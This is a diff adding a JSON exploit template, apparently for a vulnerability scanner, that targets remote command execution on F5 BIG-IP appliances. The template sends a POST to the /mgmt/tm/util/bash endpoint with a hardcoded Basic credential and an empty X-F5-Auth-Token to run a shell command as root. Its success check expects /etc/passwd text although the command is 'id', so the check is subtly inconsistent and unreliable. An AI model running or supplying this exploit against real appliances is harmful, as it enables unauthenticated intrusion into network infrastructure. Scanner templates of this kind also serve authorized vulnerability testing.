@@ -1,0 +1,35 @@
+{
+    "Name": "F5_bigip远程命令执行",
+    "Description": "F5_bigip远程命令执行",
+    "Product": "F5_bigip",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "POST",
+        "Header": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+            "Content-Type":"application/json",
+            "Authorization":"Basic YWRtaW46QVNhc1M=","X-F5-Auth-Token":" "},
+        "Uri":"/mgmt/tm/util/bash",
+        "Port":"",
+        "Data":"{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "root:x:0:0:root"
+                },
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":""
+                }
+]}
